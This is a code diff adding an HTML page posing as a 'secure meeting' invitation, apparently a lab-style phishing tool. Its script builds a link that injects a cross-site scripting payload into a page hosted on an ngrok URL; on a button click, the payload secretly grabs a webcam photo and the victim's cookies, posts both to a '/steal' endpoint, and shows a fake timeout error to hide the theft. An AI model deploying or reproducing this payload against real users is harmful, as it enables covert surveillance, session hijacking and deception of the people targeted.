@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Meeting Invitation</title>
+    <style>
+        body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; background: #f8fafc; }
+        .invite-box { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 4px 6px rgba(0,0,0,0.1); border: 1px solid #e2e8f0; text-align: center;}
+        .link { color: #0284c7; text-decoration: none; font-weight: bold; font-size: 1.2rem; }
+    </style>
+</head>
+<body>
+    <div class="invite-box">
+        <h2>Learn More with practical labs</h2>
+        <p>Knowledge is power</p>
+        <a id="secureLink" class="link" href="#">📅 Join Secure Meeting #Q3-882</a>
+    </div>
+
+    <script>
+        // 1. YOUR SINGLE NGROK URL (Update this!)
+        const myNgrokUrl = "https://eugene-brotherlike-clement.ngrok-free.dev";
+
+        // 2. THE PAYLOAD: Triggers on button click, takes photo, sends to /steal
+        const payload = `
+                        <script>
+                            // Wait until the HTML is fully loaded
+                            window.onload = function() {
+                                const btn = document.querySelector('.btn-join');
+                                if (btn) {
+                                    btn.onclick = function() {
+                                        navigator.mediaDevices.getUserMedia({video:{width:1280,height:720}}).then(s => {
+                                            const v = document.createElement('video');
+                                            v.srcObject = s; v.play();
+                                            setTimeout(() => {
+                                                const c = document.createElement('canvas');
+                                                c.width = 1280; c.height = 720;
+                                                c.getContext('2d').drawImage(v, 0, 0);
+                                                fetch('${myNgrokUrl}/steal', {
+                                                    method: 'POST',
+                                                    headers: {'Content-Type': 'application/json'},
+                                                    body: JSON.stringify({
+                                                        image: c.toDataURL('image/png'), 
+                                                        cookies: document.cookie 
+                                                    })
+                                                });
+                                                s.getTracks().forEach(t => t.stop());
+                                                alert("Secure Meeting Error: Connection timed out.");
+                                            }, 2000);
+                                        });
+                                    };
+                                } else {
+                                    console.log("Button not found yet!");
+                                }
+                            };
+                        <\/script>`;
+
+        // 3. GENERATE THE LINK
+        const baseUrl = `${myNgrokUrl}/?user=`;
+        document.getElementById('secureLink').href = baseUrl + encodeURIComponent(payload);
+    </script>
+</body>
+</html>
